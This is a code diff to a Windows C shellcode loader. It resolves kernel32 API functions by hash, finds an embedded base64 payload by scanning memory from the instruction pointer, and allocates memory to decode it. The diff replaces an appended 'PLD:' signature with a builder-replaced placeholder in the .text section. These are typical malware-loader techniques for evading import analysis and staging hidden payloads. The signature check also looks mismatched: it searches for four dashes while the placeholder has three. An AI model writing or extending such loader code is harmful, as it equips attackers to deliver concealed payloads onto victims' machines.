@@ -36,7 +36,11 @@ typedef struct _RELOC_ENTRY {
     WORD Type : 4;
 } RELOC_ENTRY, *PRELOC_ENTRY;
 
-// Entry point MUST be first for shellcode
+// Placeholder for the base64 payload.
+// The builder will replace this string.
+// We put it in the .text section so we can find it relatively.
+__attribute__((section(".text"))) const char payload_b64[] = "---PAYLOAD_PLACEHOLDER---";
+
 void LoaderEntry() {
     API_TABLE api;
     // kernel32.dll = 0x7040ee75
@@ -52,17 +56,20 @@ void LoaderEntry() {
 
     if (!api.LoadLibraryA || !api.GetProcAddress || !api.VirtualAlloc) return;
 
-    // Search for signature "PLD:" appended after shellcode
+    // To be truly PIC, we need to find payload_b64 relatively.
+    // However, since it's in .text, we can use GetRIP and search for the placeholder prefix "---PAYLOAD"
     ULONG_PTR rip = GetRIP();
     const char* p = (const char*)rip;
     while (1) {
-        if (*(DWORD*)p == 0x3a444c50) break;
+        if (*(DWORD*)p == 0x2d2d2d2d && *(DWORD*)(p+4) == 0x4c594150) break; // "----" and "PAYL"
         p++;
     }
-    p += 4; // Skip "PLD:"
+    // Skip prefix "---PAYLOAD_PLACEHOLDER---" is replaced by "---PAYLOAD:..."
+    while (*p != ':') p++;
+    p++; // Now p points to the base64 string
 
     size_t b64_len = 0;
-    while (p[b64_len] != 0) b64_len++;
+    while (p[b64_len] != '-' && p[b64_len] != 0) b64_len++;
 
     BYTE* raw = (BYTE*)api.VirtualAlloc(NULL, b64_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!raw) return;
